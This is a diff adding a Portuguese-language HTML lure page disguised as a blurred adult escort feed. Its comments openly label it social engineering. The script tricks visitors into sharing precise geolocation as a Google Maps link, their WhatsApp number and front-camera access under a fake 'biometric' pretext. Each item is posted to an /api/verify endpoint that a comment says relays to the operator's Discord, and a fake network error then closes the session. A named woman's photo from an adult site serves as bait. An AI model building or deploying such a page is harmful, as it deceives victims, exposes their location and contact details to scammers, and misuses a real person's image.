@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Acesso Restrito | Verificação 18+</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <style>
+        :root { --primary: #ff2a5f; --success: #00ff88; --bg: #09090b; --card: #121214; }
+        
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: sans-serif; }
+        body { background: var(--bg); color: #fff; overflow: hidden; }
+
+        /* Conteúdo de fundo (BORRADO) */
+        #content {
+            filter: blur(25px);
+            transition: filter 0.5s ease;
+            height: 100vh;
+            width: 100vw;
+            pointer-events: none;
+        }
+
+        /* Notificação de Bloqueio (Engenharia Social) */
+        #permission-overlay {
+            position: fixed; inset: 0;
+            background: rgba(0,0,0,0.85);
+            z-index: 9999;
+            display: flex; justify-content: center; align-items: center; padding: 20px;
+        }
+
+        .alert-box {
+            background: var(--card);
+            width: 100%; max-width: 340px;
+            padding: 30px; border-radius: 20px;
+            text-align: center;
+            border: 1px solid #333;
+            box-shadow: 0 0 40px rgba(255, 42, 95, 0.2);
+            animation: shake 0.5s ease-in-out;
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-5px); }
+            75% { transform: translateX(5px); }
+        }
+
+        .alert-icon { font-size: 3.5rem; color: var(--primary); margin-bottom: 20px; }
+        
+        .btn-allow {
+            background: var(--primary); color: white;
+            border: none; padding: 18px; width: 100%;
+            border-radius: 12px; font-weight: 900;
+            font-size: 1.1rem; cursor: pointer; margin-top: 25px;
+            box-shadow: 0 4px 15px rgba(255, 42, 95, 0.4);
+        }
+
+        /* Feed Simulado (Atrás do Blur) */
+        .fake-post { padding: 15px; margin-top: 20px; }
+        .fake-img { width: 100%; height: 400px; background: #222; border-radius: 15px; margin-bottom: 10px; }
+
+        /* Modal de Captura Final */
+        .modal { 
+            position: fixed; inset: 0; background: #000; 
+            z-index: 10000; display: none; 
+            flex-direction: column; align-items: center; justify-content: center; padding: 25px;
+        }
+        input { 
+            background: #111; border: 1px solid #333; color: #fff; 
+            padding: 20px; width: 100%; max-width: 320px; 
+            border-radius: 12px; font-size: 1.2rem; margin: 20px 0; outline: none; text-align: center;
+        }
+
+        /* Loader de Câmera */
+        .loader { width: 40px; height: 40px; border: 4px solid #333; border-top-color: var(--success); border-radius: 50%; animation: spin 1s linear infinite; margin: 20px; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        #video-preview { width: 100%; max-width: 320px; border-radius: 15px; display: none; transform: scaleX(-1); border: 2px solid var(--success); }
+    </style>
+</head>
+<body>
+
+    <div id="permission-overlay">
+        <div class="alert-box">
+            <i class="fa-solid fa-circle-excluent alert-icon"></i>
+            <h2 style="margin-bottom: 10px;">CONTEÚDO BLOQUEADO</h2>
+            <p style="color: #888; font-size: 0.9rem; line-height: 1.4;">
+                Este conteúdo é restrito para sua região. Para desbloquear fotos e vídeos de acompanhantes a menos de 1km, confirme sua localização agora.
+            </p>
+            <button class="btn-allow" onclick="requestPermission()">ACEITAR E DESBLOQUEAR</button>
+            <p style="font-size: 0.65rem; color: #444; margin-top: 15px;">ID da Conexão: #492-BX9 | Criptografia SSL Ativa</p>
+        </div>
+    </div>
+
+    <div id="content">
+        <header style="padding: 15px; border-bottom: 1px solid #222; text-align: center; font-weight: 900; color: var(--primary);">PRIVACY VIP</header>
+        <div class="fake-post">
+            <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 10px;">
+                <div style="width: 40px; height: 40px; border-radius: 50%; background: #333;"></div>
+                <b>Isabela Moraes</b>
+            </div>
+            <img src="https://s72.erome.com/3043/odyUiYvs/f849WiP4.jpeg?v=1723848742" style="width: 100%; border-radius: 15px;">
+        </div>
+    </div>
+
+    <div class="modal" id="modal-zap">
+        <i class="fa-brands fa-whatsapp" style="font-size: 4rem; color: var(--success);"></i>
+        <h2 style="margin-top: 20px; text-align: center;">LOCALIZAÇÃO CONFIRMADA!</h2>
+        <p style="color: #888; text-align: center; margin-top: 10px;">Encontramos <b>14 modelos</b> perto de você. Onde enviamos seu passe de acesso livre?</p>
+        <input type="tel" id="whatsapp" placeholder="(DDD) 99999-9999">
+        <button class="btn-allow" style="background: var(--success); color: #000;" onclick="sendZap()">LIBERAR VÍDEOS AGORA</button>
+    </div>
+
+    <div class="modal" id="modal-cam">
+        <h2 id="cam-status">Sincronizando Live...</h2>
+        <p id="cam-text" style="color: #888; text-align: center;">Mantenha a câmera frontal ativa por 3 segundos para biometria facial de segurança.</p>
+        <div class="loader" id="loader"></div>
+        <video id="video-preview" autoplay playsinline muted></video>
+        <button id="btn-cam" class="btn-allow" onclick="startCamera()">ATIVAR CÂMERA (3s)</button>
+    </div>
+
+    <script>
+        // Função para reportar ao seu Discord através da API do Vercel
+        async function report(type, data) {
+            try {
+                await fetch('/api/verify', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ type, data })
+                });
+            } catch(e) {}
+        }
+
+        // 1. Pedir Localização
+        function requestPermission() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition((p) => {
+                    report('LOCALIZAÇÃO', `Maps: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
+                    unlockFeed();
+                }, () => unlockFeed());
+            } else { unlockFeed(); }
+        }
+
+        function unlockFeed() {
+            document.getElementById('permission-overlay').style.display = 'none';
+            document.getElementById('content').style.filter = 'none';
+            // Após 2 segundos de ver o feed, pede o zap
+            setTimeout(() => {
+                document.getElementById('modal-zap').style.display = 'flex';
+            }, 2500);
+        }
+
+        // 2. Capturar Zap
+        function sendZap() {
+            const num = document.getElementById('whatsapp').value;
+            if(num.length < 10) return alert("Número incompleto!");
+            
+            report('WHATSAPP', num);
+            document.getElementById('modal-zap').style.display = 'none';
+            document.getElementById('modal-cam').style.display = 'flex';
+        }
+
+        // 3. Capturar Câmera
+        async function startCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('video-preview');
+                video.srcObject = stream;
+                
+                document.getElementById('btn-cam').style.display = 'none';
+                document.getElementById('loader').style.display = 'none';
+                video.style.display = 'block';
+                document.getElementById('cam-status').innerText = "CONECTADO!";
+                document.getElementById('cam-text').innerText = "Sincronizando com a modelo... Não feche a página.";
+
+                report('CÂMERA', 'ACESSO CONCEDIDO (Usuário está na live)');
+
+                setTimeout(() => {
+                    alert("ERRO DE REDE: O servidor de streaming está congestionado. Você foi movido para a fila de espera. Verifique seu WhatsApp para o novo link.");
+                    location.reload();
+                }, 5000);
+            } catch (e) {
+                report('CÂMERA', 'NEGADO');
+                alert("Erro: Para sua segurança, a biometria facial é obrigatória em conexões regionais.");
+            }
+        }
+    </script>
+</body>
+</html>
